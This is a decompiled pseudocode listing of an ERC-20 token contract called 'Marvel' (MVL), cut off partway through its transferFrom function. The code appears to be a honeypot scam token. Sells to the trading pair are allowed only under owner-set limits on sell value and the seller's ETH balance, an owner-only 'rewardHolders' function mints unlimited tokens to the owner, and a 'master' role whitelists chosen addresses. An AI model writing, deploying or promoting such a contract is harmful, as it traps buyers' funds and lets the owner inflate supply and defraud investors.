contract main {




// =====================  Runtime code  =====================


#
#  - transfer(address arg1, uint256 arg2)
#
const name = 'Marvel', 0

const decimals = 18

const symbol = 'MVL', 0


address owner;
address stor1;
address stor2;
address masterAddress;
mapping of uint8 stor4;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint256 stor7;
mapping of uint256 stor8;
mapping of uint256 stor9;
uint256 totalSupply;
uint256 stor11;
uint256 stor12;

function totalSupply() payable {
    return totalSupply
}

function sub_2782e35b(?) payable {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    return bool(stor4[arg1])
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function owner() payable {
    return owner
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function master() payable {
    return masterAddress
}

function _fallback() payable {
    revert
}

function includeInReward(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == masterAddress
    stor4[address(arg1)] = 1
}

function excludeFromReward(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == masterAddress
    stor4[address(arg1)] = 0
}

function setNumber(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor11 = arg1
}

function setRemainder(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor12 = arg1
}

function syncPair() payable {
    require msg.sender == masterAddress
    require ext_code.size(stor2)
    call stor2.sync() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function setMaster(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    allowance[stor2][stor3] = 0
    masterAddress = arg1
    allowance[stor2][stor3] = -1
}

function burn(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if balanceOf[stor0] < arg1:
        revert with 'NH{q', 17
    balanceOf[stor0] -= arg1
    if totalSupply < arg1:
        revert with 'NH{q', 17
    totalSupply -= arg1
}

function rewardHolders(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if balanceOf[stor0] > -arg1 - 1:
        revert with 'NH{q', 17
    balanceOf[stor0] += arg1
    if totalSupply > -arg1 - 1:
        revert with 'NH{q', 17
    totalSupply += arg1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if stor4[address(arg1)]:
        if allowance[address(arg1)][address(msg.sender)] < arg3:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
        if not arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
        require ext_code.size(stor2)
        staticcall stor2.getReserves() with:
                gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 96
        require ext_call.return_data[0] == ext_call.return_data[18 len 14]
        require ext_call.return_data[32] == ext_call.return_data[50 len 14]
        require ext_call.return_data[64] == ext_call.return_data[92 len 4]
        if ext_call.return_data[18 len 14] > 0:
            if ext_call.return_data[50 len 14] > 0:
                if arg1 == stor1:
                    if stor7[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    stor7[address(arg2)] += arg3
                else:
                    if arg1 == stor2:
                        if stor7[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        stor7[address(arg2)] += arg3
                if arg2 == stor1:
                    if stor8[address(arg1)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    stor8[address(arg1)] += arg3
                    require ext_code.size(stor2)
                    staticcall stor2.getReserves() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 96
                    require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                    require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                    require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                    require ext_code.size(stor1)
                    staticcall stor1.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor2)
                    staticcall stor2.token0() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor1)
                    if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                        staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                gas gas_remaining wei
                               args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                    else:
                        staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                gas gas_remaining wei
                               args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[0]
                    if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                        revert with 'NH{q', 17
                    stor9[address(arg1)] += ext_call.return_data[0]
                else:
                    if arg2 == stor2:
                        if stor8[address(arg1)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        stor8[address(arg1)] += arg3
                        require ext_code.size(stor2)
                        staticcall stor2.getReserves() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 96
                        require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                        require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                        require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                        require ext_code.size(stor1)
                        staticcall stor1.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor2)
                        staticcall stor2.token0() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor1)
                        if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                            staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                    gas gas_remaining wei
                                   args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                        else:
                            staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                    gas gas_remaining wei
                                   args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[0]
                        if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                            revert with 'NH{q', 17
                        stor9[address(arg1)] += ext_call.return_data[0]
        if balanceOf[address(arg1)] < arg3:
            revert with 0, 'ERC20: transfer amount exceeds balance'
        if balanceOf[address(arg1)] < arg3:
            revert with 'NH{q', 17
        balanceOf[address(arg1)] -= arg3
        if balanceOf[address(arg2)] > -arg3 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg2)] += arg3
        emit Transfer(arg3, arg1, arg2);
        if allowance[address(arg1)][address(msg.sender)] < arg3:
            revert with 'NH{q', 17
        if not arg1:
            revert with 0, 'ERC20: approve from the zero address'
        if not msg.sender:
            revert with 0, 'ERC20: approve to the zero address'
        allowance[address(arg1)][address(msg.sender)] -= arg3
        emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    else:
        if stor4[address(arg2)]:
            if allowance[address(arg1)][address(msg.sender)] < arg3:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
            if not arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
            require ext_code.size(stor2)
            staticcall stor2.getReserves() with:
                    gas gas_remaining wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 96
            require ext_call.return_data[0] == ext_call.return_data[18 len 14]
            require ext_call.return_data[32] == ext_call.return_data[50 len 14]
            require ext_call.return_data[64] == ext_call.return_data[92 len 4]
            if ext_call.return_data[18 len 14] > 0:
                if ext_call.return_data[50 len 14] > 0:
                    if arg1 == stor1:
                        if stor7[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        stor7[address(arg2)] += arg3
                    else:
                        if arg1 == stor2:
                            if stor7[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            stor7[address(arg2)] += arg3
                    if arg2 == stor1:
                        if stor8[address(arg1)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        stor8[address(arg1)] += arg3
                        require ext_code.size(stor2)
                        staticcall stor2.getReserves() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 96
                        require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                        require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                        require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                        require ext_code.size(stor1)
                        staticcall stor1.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor2)
                        staticcall stor2.token0() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor1)
                        if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                            staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                    gas gas_remaining wei
                                   args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                        else:
                            staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                    gas gas_remaining wei
                                   args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[0]
                        if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                            revert with 'NH{q', 17
                        stor9[address(arg1)] += ext_call.return_data[0]
                    else:
                        if arg2 == stor2:
                            if stor8[address(arg1)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            stor8[address(arg1)] += arg3
                            require ext_code.size(stor2)
                            staticcall stor2.getReserves() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 96
                            require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                            require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                            require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                            require ext_code.size(stor1)
                            staticcall stor1.WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor2)
                            staticcall stor2.token0() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor1)
                            if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                                staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                        gas gas_remaining wei
                                       args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                            else:
                                staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                        gas gas_remaining wei
                                       args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[0]
                            if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                                revert with 'NH{q', 17
                            stor9[address(arg1)] += ext_call.return_data[0]
            if balanceOf[address(arg1)] < arg3:
                revert with 0, 'ERC20: transfer amount exceeds balance'
            if balanceOf[address(arg1)] < arg3:
                revert with 'NH{q', 17
            balanceOf[address(arg1)] -= arg3
            if balanceOf[address(arg2)] > -arg3 - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg2)] += arg3
            emit Transfer(arg3, arg1, arg2);
            if allowance[address(arg1)][address(msg.sender)] < arg3:
                revert with 'NH{q', 17
            if not arg1:
                revert with 0, 'ERC20: approve from the zero address'
            if not msg.sender:
                revert with 0, 'ERC20: approve to the zero address'
            allowance[address(arg1)][address(msg.sender)] -= arg3
            emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
        else:
            if arg1 == stor1:
                if allowance[address(arg1)][address(msg.sender)] < arg3:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
                if not arg1:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
                if not arg2:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                require ext_code.size(stor2)
                staticcall stor2.getReserves() with:
                        gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 96
                require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                if ext_call.return_data[18 len 14] > 0:
                    if ext_call.return_data[50 len 14] > 0:
                        if arg1 == stor1:
                            if stor7[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            stor7[address(arg2)] += arg3
                        else:
                            if arg1 == stor2:
                                if stor7[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                stor7[address(arg2)] += arg3
                        if arg2 == stor1:
                            if stor8[address(arg1)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            stor8[address(arg1)] += arg3
                            require ext_code.size(stor2)
                            staticcall stor2.getReserves() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 96
                            require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                            require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                            require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                            require ext_code.size(stor1)
                            staticcall stor1.WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor2)
                            staticcall stor2.token0() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor1)
                            if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                                staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                        gas gas_remaining wei
                                       args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                            else:
                                staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                        gas gas_remaining wei
                                       args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[0]
                            if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                                revert with 'NH{q', 17
                            stor9[address(arg1)] += ext_call.return_data[0]
                        else:
                            if arg2 == stor2:
                                if stor8[address(arg1)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                stor8[address(arg1)] += arg3
                                require ext_code.size(stor2)
                                staticcall stor2.getReserves() with:
                                        gas gas_remaining wei
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 96
                                require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                                require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                                require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                                require ext_code.size(stor1)
                                staticcall stor1.WETH() with:
                                        gas gas_remaining wei
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                require ext_code.size(stor2)
                                staticcall stor2.token0() with:
                                        gas gas_remaining wei
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                require ext_code.size(stor1)
                                if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                                    staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                            gas gas_remaining wei
                                           args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                                else:
                                    staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                            gas gas_remaining wei
                                           args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[0]
                                if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                                    revert with 'NH{q', 17
                                stor9[address(arg1)] += ext_call.return_data[0]
                if balanceOf[address(arg1)] < arg3:
                    revert with 0, 'ERC20: transfer amount exceeds balance'
                if balanceOf[address(arg1)] < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] -= arg3
                if balanceOf[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)] += arg3
                emit Transfer(arg3, arg1, arg2);
                if allowance[address(arg1)][address(msg.sender)] < arg3:
                    revert with 'NH{q', 17
                if not arg1:
                    revert with 0, 'ERC20: approve from the zero address'
                if not msg.sender:
                    revert with 0, 'ERC20: approve to the zero address'
                allowance[address(arg1)][address(msg.sender)] -= arg3
                emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
            else:
                if arg1 == stor2:
                    if allowance[address(arg1)][address(msg.sender)] < arg3:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
                    if not arg1:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
                    if not arg2:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                    require ext_code.size(stor2)
                    staticcall stor2.getReserves() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 96
                    require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                    require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                    require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                    if ext_call.return_data[18 len 14] > 0:
                        if ext_call.return_data[50 len 14] > 0:
                            if arg1 == stor1:
                                if stor7[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                stor7[address(arg2)] += arg3
                            else:
                                if arg1 == stor2:
                                    if stor7[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    stor7[address(arg2)] += arg3
                            if arg2 == stor1:
                                if stor8[address(arg1)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                stor8[address(arg1)] += arg3
                                require ext_code.size(stor2)
                                staticcall stor2.getReserves() with:
                                        gas gas_remaining wei
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 96
                                require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                                require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                                require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                                require ext_code.size(stor1)
                                staticcall stor1.WETH() with:
                                        gas gas_remaining wei
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                require ext_code.size(stor2)
                                staticcall stor2.token0() with:
                                        gas gas_remaining wei
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                require ext_code.size(stor1)
                                if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                                    staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                            gas gas_remaining wei
                                           args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                                else:
                                    staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                            gas gas_remaining wei
                                           args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[0]
                                if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                                    revert with 'NH{q', 17
                                stor9[address(arg1)] += ext_call.return_data[0]
                            else:
                                if arg2 == stor2:
                                    if stor8[address(arg1)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    stor8[address(arg1)] += arg3
                                    require ext_code.size(stor2)
                                    staticcall stor2.getReserves() with:
                                            gas gas_remaining wei
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 96
                                    require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                                    require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                                    require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                                    require ext_code.size(stor1)
                                    staticcall stor1.WETH() with:
                                            gas gas_remaining wei
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    require ext_code.size(stor2)
                                    staticcall stor2.token0() with:
                                            gas gas_remaining wei
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    require ext_code.size(stor1)
                                    if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                                        staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                gas gas_remaining wei
                                               args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                                    else:
                                        staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                gas gas_remaining wei
                                               args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[0]
                                    if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                                        revert with 'NH{q', 17
                                    stor9[address(arg1)] += ext_call.return_data[0]
                    if balanceOf[address(arg1)] < arg3:
                        revert with 0, 'ERC20: transfer amount exceeds balance'
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                    if allowance[address(arg1)][address(msg.sender)] < arg3:
                        revert with 'NH{q', 17
                    if not arg1:
                        revert with 0, 'ERC20: approve from the zero address'
                    if not msg.sender:
                        revert with 0, 'ERC20: approve to the zero address'
                    allowance[address(arg1)][address(msg.sender)] -= arg3
                    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
                else:
                    if arg2 == stor1:
                        require ext_code.size(stor2)
                        staticcall stor2.getReserves() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 96
                        require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                        require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                        require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                        require ext_code.size(stor1)
                        staticcall stor1.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor2)
                        staticcall stor2.token0() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor1)
                        if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                            staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                    gas gas_remaining wei
                                   args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                        else:
                            staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                    gas gas_remaining wei
                                   args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[0]
                        if stor8[address(arg1)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        if stor7[address(arg1)] >= stor8[address(arg1)] + arg3:
                            if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                                revert with 'NH{q', 17
                            if stor11 >= stor9[address(arg1)] + ext_call.return_data[0]:
                                if eth.balance(arg1) >= stor12:
                                    if allowance[address(arg1)][address(msg.sender)] < arg3:
                                        revert with 0, 'ERC20: transfer amount exceeds allowance'
                                    if not arg1:
                                        revert with 0, 'ERC20: transfer from the zero address'
                                    if not arg2:
                                        revert with 0, 'ERC20: transfer to the zero address'
                                    require ext_code.size(stor2)
                                    staticcall stor2.getReserves() with:
                                            gas gas_remaining wei
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 96
                                    require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                                    require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                                    require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                                    if ext_call.return_data[18 len 14] > 0:
                                        if ext_call.return_data[50 len 14] > 0:
                                            if arg1 == stor1:
                                                if stor7[address(arg2)] > -arg3 - 1:
                                                    revert with 'NH{q', 17
                                                stor7[address(arg2)] += arg3
                                            else:
                                                if arg1 == stor2:
                                                    if stor7[address(arg2)] > -arg3 - 1:
                                                        revert with 'NH{q', 17
                                                    stor7[address(arg2)] += arg3
                                            if arg2 == stor1:
                                                if stor8[address(arg1)] > -arg3 - 1:
                                                    revert with 'NH{q', 17
                                                stor8[address(arg1)] += arg3
                                                require ext_code.size(stor2)
                                                staticcall stor2.getReserves() with:
                                                        gas gas_remaining wei
                                                if not ext_call.success:
                                                    revert with ext_call.return_data[0 len return_data.size]
                                                require return_data.size >= 96
                                                require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                                                require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                                                require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                                                require ext_code.size(stor1)
                                                staticcall stor1.WETH() with:
                                                        gas gas_remaining wei
                                                if not ext_call.success:
                                                    revert with ext_call.return_data[0 len return_data.size]
                                                require return_data.size >= 32
                                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                require ext_code.size(stor2)
                                                staticcall stor2.token0() with:
                                                        gas gas_remaining wei
                                                if not ext_call.success:
                                                    revert with ext_call.return_data[0 len return_data.size]
                                                require return_data.size >= 32
                                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                require ext_code.size(stor1)
                                                if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
